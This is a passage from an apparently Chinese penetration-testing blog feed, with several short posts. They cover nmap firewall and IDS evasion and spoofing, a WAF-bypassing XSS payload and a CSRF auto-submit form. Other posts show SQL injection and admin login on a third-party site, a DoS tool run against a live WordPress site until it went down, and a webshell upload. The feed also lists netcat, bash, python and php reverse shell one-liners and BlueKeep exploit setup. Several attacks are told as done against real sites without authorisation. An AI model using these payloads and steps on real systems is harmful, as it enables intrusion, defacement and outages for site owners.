8</code></p><ul><li>强度级别0到9，数字越大，正确性越强，默认值为7</li></ul></li><li><p><code>nmap 192.168.1.1 -sV --version-light</code></p><ul><li>轻量级版本扫描，使扫描进程加快，但它识别服务的正确率降低</li></ul></li><li><p><code>nmap 192.168.1.1 -sV --version-all </code></p><ul><li>version-all相当于version-intensity的最高级别9，保证对每个端口尝试每个探测报文</li></ul></li><li><p><code>nmap 192.168.1.1 -A</code></p><ul><li>启用操作系统检测，版本检测，脚本扫描和跟踪路由…</li></ul></li><li><p><code>nmap 192.168.1.1 -O</code></p><ul><li>使用TCP/IP进行远程OS指纹识别</li></ul></li><li><p><code>nmap 192.168.1.1 -O --osscan-guess</code></p><ul><li>当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配</li></ul></li></ul><hr><h3 id="防火墙-IDS规避和欺骗"><a href="#防火墙-IDS规避和欺骗" class="headerlink" title="防火墙/IDS规避和欺骗"></a>防火墙/IDS规避和欺骗</h3><ul><li><p><code>nmap 192.168.1.1 -f</code></p><ul><li>报文分段，请求的扫描(包括ping扫描)使用微小的碎片IP数据包, 包过滤器检测更难</li></ul></li><li><p><code>nmap 192.168.1.1 --mtu 32 </code></p><ul><li>利用数据包分片技术，某些防火墙为了加快处理速度而不会进行重组处理，这样从而逃脱防火墙或闯入检测系统的检测,注意:mtu的值必须是 8 的倍数(如8,16,24,32等)</li></ul></li><li><p><code>nmap -D 10.1.1.1,20.2.2.2 192.168.1.1</code></p></li><li><p><code>nmap -D RND:11 192.168.1.1</code></p><ul><li>使用-D选项就可以达到IP欺骗的目的,可以指定多个IP或者使用RND随机生成几个IP地址</li></ul></li><li><p><code>nmap -S www.microso.com www.facebook.com</code></p><ul><li>源地址欺骗,从Microso扫描Facebook</li></ul></li><li><p><code>nmap -g 53 192.168.1.1</code></p><ul><li>指定源主机端口,来手动设定用来扫描的端口,s常用的如 20、53、67 端口</li></ul></li><li><p><code>nmap --proxies http://191.1.1.1:1080,http://192.2.2.2:1080 192.168.1.1</code></p><ul><li>通过HTTP/SOCKS4代理中继连接</li></ul></li><li><p><code>nmap --data-length 200 192.168.1.1</code></p><ul><li>添加垃圾数据,通过在发送的数据包末尾添加随机的垃圾数据，以达到混淆视听的作效果,200是垃圾数据长度</li></ul></li><li><p><code>nmap --spoof-mac 0 192.168.1.1</code></p><ul><li>伪装MAC地址,可以手动指定 MAC 地址的值。或者为了简单起见,可以填写数字 0,这将生成一个随机的 MAC 地址</li></ul></li><li><p><code>nmap --badsum 192.168.1.1</code></p><ul><li>伪造检验值,这将使用伪造的 TCP/UDP/SCTP 校验和发送数据</li></ul></li></ul><p><strong>示例IDS规避命令</strong></p><p><code>nmap -f -T0 -n -Pn --data-length 200 -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1</code></p><hr><h3 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h3><p><strong>open(开放的)</strong></p><p>应用程序正在该端口接收TCP 连接或者UDP报文。发现这一点常常是端口扫描 的主要目标。安全意识强的人们知道每个开放的端口 都是攻击的入口。攻击者或者入侵测试者想要发现开放的端口。 而管理员则试图关闭它们或者用防火墙保护它们以免妨碍了合法用户。 非安全扫描可能对开放的端口也感兴趣，因为它们显示了网络上那些服务可供使用。</p><p><strong>closed(关闭的)</strong></p><p>关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。 它们可以显示该IP地址上(主机发现，或者ping扫描)的主机正在运行up 也对部分操作系统探测有所帮助。 因为关闭的关口是可访问的，也许过会儿值得再扫描一下，可能一些又开放了。 系统管理员可能会考虑用防火墙封锁这样的端口。 那样他们就会被显示为被过滤的状态，下面讨论。</p><p><strong>filtered(被过滤的)</strong></p><p>由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。这样的端口让攻击者感觉很挫折，因为它们几乎不提供 任何信息。有时候它们响应ICMP错误消息如类型3代码13 (无法到达目标: 通信被管理员禁止)，但更普遍的是过滤器只是丢弃探测帧， 不做任何响应。 这迫使Nmap重试若干次以访万一探测包是由于网络阻塞丢弃的。 这使得扫描速度明显变慢。</p><p><strong>unfiltered(未被过滤的)</strong></p><p>未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。 只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。 用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定 端口是否开放。</p><p><strong>open|filtered(开放或者被过滤的)</strong></p><p>当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。因此Nmap无法确定该端口是开放的还是被过滤的。 UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。</p><p><strong>closed|filtered(关闭或者被过滤的)</strong></p><p>该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。</p>]]></content>
      
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByPass安全狗XSS</title>
      <link href="2020/08/06/ByPass%E5%AE%89%E5%85%A8%E7%8B%97XSS/"/>
      <url>2020/08/06/ByPass%E5%AE%89%E5%85%A8%E7%8B%97XSS/</url>
      
        <content type="html"><![CDATA[<p>他有少年侠气，亦存柔软心肠</p><hr><span id="more"></span><p>做项目的时候测试一个商城网站，发现购买处对地址的显示没有做过滤</p><p><img src="https://i.loli.net/2020/08/06/bWtkip9TeyxNs6F.png" alt="Assassins小白"></p><p>可解析图片标签</p><p><img src="https://i.loli.net/2020/08/06/6TfB3MXb1LU8dzc.png" alt="Assassins小白"></p><p>但是使用事件弹窗的时候发现网站有安全狗，被拦截</p><p><img src="https://i.loli.net/2020/08/06/qvruXl5b1JiUHdt.png" alt="Assassins小白"></p><p>然后使用Bypass语句绕过</p><p><img src="https://i.loli.net/2020/08/06/4nqlDc3eEZ9jgBQ.png" alt="Assassins小白"></p><p>弹窗</p><p><img src="https://i.loli.net/2020/08/06/32VwHtBEUWXQJOg.png" alt="Assassins小白"></p><p>Payload：</p><p><code>&lt;details onauxclick=confirm(/xb/)&gt;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bypass </tag>
            
            <tag> 安全狗 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite自动化检测CORS漏洞</title>
      <link href="2020/03/11/BurpSuite%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8BCORS%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/03/11/BurpSuite%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8BCORS%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>生活比电影狠多了，从来不给弱者安排大逆转的情节 </p><hr><span id="more"></span><p>BurpSuite的 <code>Match and Replace</code> 如下图设置</p><p><img src="../../../../img/20-3-11/1.png" alt="Assassins小白"></p><p>然后就会自动 加上/替换 Origin头为 <code>foo.example.org</code></p><p><img src="../../../../img/20-3-11/2.png" alt="Assassins小白"></p><p>然后再寻找返回头里面存在 <code>Origin: foo.example.org</code> 的就可以了，可以使用search</p>]]></content>
      
      
      
        <tags>
            
            <tag> BurpSuite </tag>
            
            <tag> 自动化 </tag>
            
            <tag> CORS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用JavaScript自动提交CSRF表单</title>
      <link href="2020/02/28/%E5%88%A9%E7%94%A8JavaScript%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4CSRF%E8%A1%A8%E5%8D%95/"/>
      <url>2020/02/28/%E5%88%A9%E7%94%A8JavaScript%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4CSRF%E8%A1%A8%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p>人非要经历一番不同平时的劫难才能脱胎换骨，成为真正能解决问题的人 </p><hr><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">  </span><br><span class="line">    &lt;form action=&quot;漏洞URL&quot; method=&quot;POST&quot; name=&quot;test&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;key&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;data&quot; value=&quot;&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      document.test.submit();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    </span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>感谢Lego</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MuMu模拟器安装BurpSuite证书</title>
      <link href="2020/02/27/MuMu%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%AE%89%E8%A3%85BurpSuite%E8%AF%81%E4%B9%A6/"/>
      <url>2020/02/27/MuMu%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%AE%89%E8%A3%85BurpSuite%E8%AF%81%E4%B9%A6/</url>
      
        <content type="html"><![CDATA[<p>你看似很努力，很上进，也只是看似而已 </p><hr><span id="more"></span><h2 id="利用BurpSuite进行APP抓包"><a href="#利用BurpSuite进行APP抓包" class="headerlink" title="利用BurpSuite进行APP抓包"></a>利用BurpSuite进行APP抓包</h2><p>BurpSuite设置监听局域网内IP</p><p><img src="../../../../img/20-2-27/1.png" alt="Assassins小白"></p><p>MuMu模拟器那边设置代理为  192.168.43.201:8080</p><p>然后用模拟器自带浏览器访问BrupSuite页面并下载证书 (例如: 192.168.43.201:8080) </p><p><img src="../../../../img/20-2-27/2.png" alt="Assassins小白"></p><p>再使用自带文件管理找到下载的证书文件，将文件后缀改为.cer </p><p><img src="../../../../img/20-2-27/3.png" alt="Assassins小白"></p><p><img src="../../../../img/20-2-27/4.png" alt="Assassins小白"></p><p><img src="../../../../img/20-2-27/5.png" alt="Assassins小白"></p><p><img src="../../../../img/20-2-27/6.png" alt="Assassins小白"></p><p>点击设置-&gt;安全-&gt;从SD卡安装证书，找到刚刚我们重命名的文件点击  证书命名可随意</p><p><img src="../../../../img/20-2-27/7.png" alt="Assassins小白"></p><p><img src="../../../../img/20-2-27/8.png" alt="Assassins小白"></p><p><img src="../../../../img/20-2-27/9.png" alt="Assassins小白"></p><p><img src="../../../../img/20-2-27/10.png" alt="Assassins小白"></p><p><img src="../../../../img/20-2-27/11.png" alt="Assassins小白"></p><p><img src="../../../../img/20-2-27/12.png" alt="Assassins小白"></p><p><img src="../../../../img/20-2-27/13.png" alt="Assassins小白"></p><p>安装成功后可以在受信任的凭据内看到我们刚刚安装的证书</p><p><img src="../../../../img/20-2-27/14.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> MuMu模拟器 </tag>
            
            <tag> BurpSuite证书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对精良南方站点的一次简单测试</title>
      <link href="2020/02/26/%E5%AF%B9%E7%B2%BE%E8%89%AF%E5%8D%97%E6%96%B9%E7%AB%99%E7%82%B9%E7%9A%84%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95/"/>
      <url>2020/02/26/%E5%AF%B9%E7%B2%BE%E8%89%AF%E5%8D%97%E6%96%B9%E7%AB%99%E7%82%B9%E7%9A%84%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>每个人真正强大起来都要度过一段没人帮忙，没人支持的日子。所有事情都是自己一个人撑，所有情绪都是只有自己知道。但只要咬牙撑过去，一切都不一样了</p><hr><span id="more"></span><p>QQ群里面大佬发了一个站叫我们去搞一下</p><p>闲的无聊就打开网站看了一下 </p><p>这个站前台是这样子的</p><p><img src="../../../../img/20-2-26/1.png" alt="Assassins小白"></p><p>域名后面加上 <code>robots.txt</code> 发现没有这个文件，出现报错，看报错推断出服务器是03的</p><p><img src="../../../../img/20-2-26/2.png" alt="Assassins小白"></p><p>再试试  <code>/admin</code> 路径，看有没有后台  这次很幸运  看这个后台界面有点熟悉 推断应该是使用的精良南方</p><p><img src="../../../../img/20-2-26/3.png" alt="Assassins小白"></p><p>然后去百度上面找精良南方的漏洞</p><p><img src="../../../../img/20-2-26/4.png" alt="Assassins小白"></p><p>使用后发现，虽然有报错，但是账号密码并没有爆出来</p><p><img src="../../../../img/20-2-26/5.png" alt="Assassins小白"></p><p>报不出来 但是能推断出来这个站是没有waf的 那我们就直接上Sqlmap跑</p><p><img src="../../../../img/20-2-26/6.png" alt="Assassins小白"></p><p>密码跑出来了发现MD5是一条收费记录</p><p><img src="../../../../img/20-2-26/7.png" alt="Assassins小白"></p><p>没办法 像我们这种没钱的也买不起 只能口算了</p><p><img src="../../../../img/20-2-26/8.png" alt="Assassins小白"></p><p>最后算出来MD5等于 <code>&quot;9932tikihappy&quot; </code></p><p>ok 登陆后台</p><p><img src="../../../../img/20-2-26/9.png" alt="Assassins小白"></p><p>然后拿shell</p><p>上传文件提示上传成功，但是访问404</p><p>前台会员不能注册/登陆</p><p>网站配置插一句话未生效</p><p>拿shell失败，该去上班了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 精良南方 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WordPress拒绝服务攻击复现(CVE-2018-6389)</title>
      <link href="2020/02/14/WordPress%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0-CVE-2018-6389/"/>
      <url>2020/02/14/WordPress%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0-CVE-2018-6389/</url>
      
        <content type="html"><![CDATA[<p>不起跬步，无以至千里；不积小流，无以成江海 </p><hr><span id="more"></span><p>xray开着被动扫描，发现有个爆红了</p><p><img src="../../../../img/20-2-1402/1.png" alt="Assassins小白"></p><p>看了看也没啥重要的东西，寻思着好不容易报个红，就看看这个站吧</p><p>然后Whatweb上去扫，发现使用的CMS是wordpress ，版本是4.9.13</p><p><img src="../../../../img/20-2-1402/2.png" alt="Assassins小白"></p><p>之前一个朋友用wordpress的一个拒绝服务漏洞，搞了个腾讯的子站交SRC，然后我寻思这个站有没有漏洞</p><p>然后就去GitHub上面搜索，发现WordPress 4.9.x版本以下都存在拒绝服务攻击，包括4.9.x</p><p><img src="../../../../img/20-2-1402/3.png" alt="Assassins小白"></p><p>这个站版本是 4.9.13 ，那还废啥话</p><p>克隆</p><p><code>git clone https://github.com/ianxtianxt/CVE-2018-6389.git</code></p><p>攻击</p><p><code>python doser.py -t 999 -g &#39;https://domain.com&#39;</code></p><p>因为我之前执行过攻击命令，现在演示还要重新执行一遍</p><p><code>history</code> 查看历史命令</p><p><img src="../../../../img/20-2-1402/4.png" alt="Assassins小白"></p><p>然后在命令行中，可以使用符号 <code>!</code> 执行指定序号的历史命令</p><p>例如，我这里要执行第331个历史命令，则输入 <code>!331</code> 就行了</p><p>没过几分钟，网站就真的被打死了，还挺好玩</p><p><img src="../../../../img/20-2-1402/5.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> 拒绝服务攻击 </tag>
            
            <tag> CVE-2018-6389 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用SSR结合BurpSuite进行抓包</title>
      <link href="2020/02/14/%E4%BD%BF%E7%94%A8SSR%E7%BB%93%E5%90%88BurpSuite%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85/"/>
      <url>2020/02/14/%E4%BD%BF%E7%94%A8SSR%E7%BB%93%E5%90%88BurpSuite%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p>和勤奋的人在一起，你不会懒惰 </p><hr><span id="more"></span><h3 id="多重代理的情形"><a href="#多重代理的情形" class="headerlink" title="多重代理的情形"></a><strong>多重代理的情形</strong></h3><p>在某些网络环境中，为了翻墙，浏览器已经设置了SSR的代理，但是如果想对国外的网站使用BurpSuite进行渗透测试，那怎么设置代理？ 这时候不能简单的把浏览器的代理设置为burpsuite，虽然能抓到包，但是却访问不了外网了，这时候该怎么办</p><p>我们首先设置浏览器的代理为BurpSuite以便能够抓包，然后为BurpSuite再设置一个上游代理(SSR)即可，这样访问外网时，请求包会先经过Burpsuite再走向SSR，最后经过SSR服务器到达外网</p><h3 id="Upstream-Proxy-Servers"><a href="#Upstream-Proxy-Servers" class="headerlink" title="Upstream Proxy Servers"></a>Upstream Proxy Servers</h3><p>在BurpSuite的 <code>User options</code> 下的 <code>Connections</code> 页面中，有个 <code>Upstream Proxy Servers</code>  配置项</p><p><img src="../../../../img/20-2-14/1.png" alt="Assassins小白"></p><p>对外网进行抓包分析， 首先要设置浏览器的代理为BurpSuite，这一点是毫无疑问的</p><p>为了能正常访问外网，还需要设置BurpSuite的上流代理为SSR（127.0.0.1:1080）</p><p>点击 <code>Upstream Proxy Servers</code> 列表框左侧的 <code>Add</code> 按钮，打开 <code>Edit upstream proxy rule</code> 对话框，这里一共有8个设置项，一般情况下只需关注前4个 </p><p><img src="../../../../img/20-2-14/2.png" alt="Assassins小白"></p><p><code>Destination host</code> ：这里填入目标网站域名或者IP，支持通配符，在本例中，我直接填写 * </p><p><code>Proxy host</code> ：填入SSR代理服务器的IP地址，即127.0.0.1</p><p><code>Proxy port</code> ：填入SSR的代理端口，即1080</p><p><code>Authentication type</code> ：这里选择认证类型，由于SSR本地代理无需认证，这是选择None</p><p>设置内容如下图所示，最后点击OK即可</p><p><img src="../../../../img/20-2-14/3.png" alt="Assassins小白"></p><p>这时候你会发现已经能够访问外网了，并且BurpSuite中也成功地抓取到了相应的请求包</p><p>你可以同时设置多个 <code>Upstream Proxy Servers</code>，在使用过程中，BurpSuite会按顺序将请求的主机与 <code>Destination host</code> 中设置的内容进行比较，并将请求内容发送至第一个相匹配的 <code>Proxy server</code></p><p>因此，<code>Proxy Server </code>的顺序很重要，讲究个先来后到！</p>]]></content>
      
      
      
        <tags>
            
            <tag> BurpSuite </tag>
            
            <tag> SSR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali环境下搭建Tomcat服务器</title>
      <link href="2020/02/12/kali%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%90%AD%E5%BB%BATomcat%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>2020/02/12/kali%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%90%AD%E5%BB%BATomcat%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>任何一件事，只要心甘情愿，总是能够变得简单，不会有任何复杂的借口和理由。</p><hr><span id="more"></span><h3 id="JDK的安装和配置"><a href="#JDK的安装和配置" class="headerlink" title="JDK的安装和配置"></a>JDK的安装和配置</h3><p>下载 <code>jdk-8u241-linux-x64.tar.gz</code> 传到kali下  <code>/usr/local/xb</code></p><p>官网下载地址 <a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a></p><p>解压并重命名文件</p><p><code>tar zxvf jdk-8u241-linux-x64.tar.gz</code></p><p><code>mv jdk-8u241-linux-x64.tar.gz jdk1.8</code></p><p>编辑配置文件 <code>etc/profile</code>  </p><p>在文档最下方添加以下环境变量配置代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;xb&#x2F;jdk1.8</span><br><span class="line">export JRE_HOME&#x3D;$&#123;JAVA_HOME&#125;&#x2F;jre</span><br><span class="line">export CLASSPATH&#x3D;.:$&#123;JAVA_HOME&#125;&#x2F;lib:$&#123;JRE_HOME&#125;&#x2F;lib:$CLASSPATH</span><br><span class="line">export JAVA_PATH&#x3D;$&#123;JAVA_HOME&#125;&#x2F;bin:$&#123;JRE_HOME&#125;&#x2F;bin</span><br><span class="line">export PATH&#x3D;$PATH:$&#123;JAVA_PATH&#125;</span><br></pre></td></tr></table></figure><p><img src="../../../../img/20-2-12/1.png" alt="Assassins小白"></p><p>使配置立即生效</p><p><code>source /etc/profile</code></p><h3 id="Tomcat的安装和配置"><a href="#Tomcat的安装和配置" class="headerlink" title="Tomcat的安装和配置"></a>Tomcat的安装和配置</h3><p>下载 <code>apache-tomcat-8.5.50.tar.gz</code> 传到kali下 <code>/usr/local/xb</code></p><p>官网下载地址  <a href="http://tomcat.apache.org/download-80.cgi">http://tomcat.apache.org/download-80.cgi</a> </p><p><img src="../../../../img/20-2-12/2.png" alt="Assassins小白"></p><p>解压并重命名文件</p><p><code>tar zxvf apache-tomcat-8.5.50.tar.gz</code><br><code>mv apache-tomcat-8.5.50  tomcat8.5.50</code></p><p>编辑配置文件 <code>etc/profile</code>  </p><p>在文档最下方添加以下环境变量配置代码</p><p><code>export CATALINA_HOME=/usr/local/software/tomcat8.5.50</code></p><p>使配置立即生效</p><p><code>source /etc/profile</code></p><h3 id="启动Tomcat服务"><a href="#启动Tomcat服务" class="headerlink" title="启动Tomcat服务"></a>启动Tomcat服务</h3><p><code>./tomcat8.5.50/bin/startup.sh</code></p><h3 id="关闭Tomcat服务"><a href="#关闭Tomcat服务" class="headerlink" title="关闭Tomcat服务"></a>关闭Tomcat服务</h3><p><code>./tomcat8.5.50/bin/shutdown.sh</code></p><h3 id="tomcat根目录"><a href="#tomcat根目录" class="headerlink" title="tomcat根目录"></a>tomcat根目录</h3><p><code>tomcat8.5.50/webapps/ROOT</code></p><p><img src="../../../../img/20-2-12/3.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试某疑似被黑站点</title>
      <link href="2019/10/12/%E6%B5%8B%E8%AF%95%E6%9F%90%E7%96%91%E4%BC%BC%E8%A2%AB%E9%BB%91%E7%AB%99%E7%82%B9/"/>
      <url>2019/10/12/%E6%B5%8B%E8%AF%95%E6%9F%90%E7%96%91%E4%BC%BC%E8%A2%AB%E9%BB%91%E7%AB%99%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p>你可以随时转身，但不能一直后退 </p><hr><span id="more"></span><p>Google搜索站点时发现某站疑似被黑</p><p><img src="../../../../img/19-10-12/1.png" alt="Assassins小白"></p><p>访问首页，是个医药站</p><p><img src="../../../../img/19-10-12/2.png" alt="Assassins小白"></p><p>丢云悉里面识别一下指纹，发现web容器是iis 7.5，试试有没有CGI解析漏洞</p><p><img src="../../../../img/19-10-12/3.png" alt="Assassins小白"></p><p>随便在网站上找一张图片，右键，访问图片地址，然后在图片后面加上 /.php 看会不会解析</p><p><img src="../../../../img/19-10-12/4.png" alt="Assassins小白"></p><p>我们看到这里他是解析了的</p><p>然后我们注册一个用户，找到一个能上传的地方，（比如上传头像、上传资料、上传证书）</p><p><img src="../../../../img/19-10-12/5.png" alt="Assassins小白"></p><p>上传一张我们的图片马，菜刀连接</p><p><img src="../../../../img/19-10-12/6.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NC基本的反弹shell操作</title>
      <link href="2019/10/04/NC%E5%9F%BA%E6%9C%AC%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E6%93%8D%E4%BD%9C/"/>
      <url>2019/10/04/NC%E5%9F%BA%E6%9C%AC%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>努力改变，不为别人，只为脱胎换骨 </p><hr><span id="more"></span><h2 id="windows反弹shell到linux"><a href="#windows反弹shell到linux" class="headerlink" title="windows反弹shell到linux"></a>windows反弹shell到linux</h2><p><strong>linux监听</strong></p><blockquote><p>nc -lvvp 33891</p></blockquote><p><strong>windows连接</strong></p><blockquote><p>nc.exe -e C:\Windows\System32\cmd.exe 192.168.1.1 33891</p></blockquote><p><img src="../../../../img/19-10-4/NC/2.png" alt="Assassins小白"></p><h2 id="linux反弹shell到windows"><a href="#linux反弹shell到windows" class="headerlink" title="linux反弹shell到windows"></a>linux反弹shell到windows</h2><p><strong>windows监听</strong></p><blockquote><p>nc -lvvp 33891</p></blockquote><p><strong>linux连接</strong>(NC)</p><blockquote><p>nc -c bash 192.168.10.224 33891</p></blockquote><p><img src="../../../../img/19-10-4/NC/3.png" alt="Assassins小白"></p><p><strong>linux连接</strong>(bash)</p><blockquote><p>bash -i&gt;&amp; /dev/tcp/192.168.10.224/33891 0&gt;&amp;1</p></blockquote><p><img src="../../../../img/19-10-4/NC/4.png" alt="Assassins小白"></p><p><strong>linux连接</strong>(python)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.10.224&quot;,33891));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure><p><img src="../../../../img/19-10-4/NC/5.png" alt="Assassins小白"></p><p><strong>linux连接</strong>(php)</p><blockquote><p>php -r ‘$sock=fsockopen(“192.168.10.224”,33891);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p></blockquote><p><img src="../../../../img/19-10-4/NC/6.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> nc </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-0708漏洞复现</title>
      <link href="2019/09/10/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2019/09/10/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>人可以被打倒，但绝不能被打败 </p><hr><span id="more"></span><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>使用VMware虚拟机安装windows 7靶机</p><p>Windows7 SP1下载链接:<code>ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</code> </p><p><img src="../../../../img/19-9-10/1.jpg" alt="Assassins小白"></p><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><p>先下载metasploit-framework，如下命令一键安装</p><p><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</code></p><p><img src="../../../../img/19-9-10/3.jpg" alt="Assassins小白"></p><p>再下载攻击”四件套”文件放置到msf相应的文件夹</p><p>下载地址 —&gt; <code>https://pan.baidu.com/s/1q-mbYQFtU1GBuJfThMk8VQ</code> 提取码: <code>mffr </code></p><p><img src="../../../../img/19-9-10/2.jpg" alt="Assassins小白"></p><blockquote><p>cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</p></blockquote><blockquote><p>cp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</p></blockquote><blockquote><p>cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</p></blockquote><blockquote><p>cp cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</p></blockquote><p>复制最后一个发现报错  <code>无法创建普通文件xxxxxx没有那个文件或目录</code></p><p><img src="../../../../img/19-9-10/4.jpg" alt="Assassins小白"></p><p>我们到<code>/opt/metasploit-framework/embedded/framework/modules/exploits/windows/</code>目录下创建rdp文件夹</p><p><img src="../../../../img/19-9-10/5.jpg" alt="Assassins小白"></p><p>然后就能复制过去了</p><p><img src="../../../../img/19-9-10/6.jpg" alt="Assassins小白"></p><h2 id="Msf待命"><a href="#Msf待命" class="headerlink" title="Msf待命"></a>Msf待命</h2><p>启动msf</p><p>搜索0708漏洞编号</p><p><img 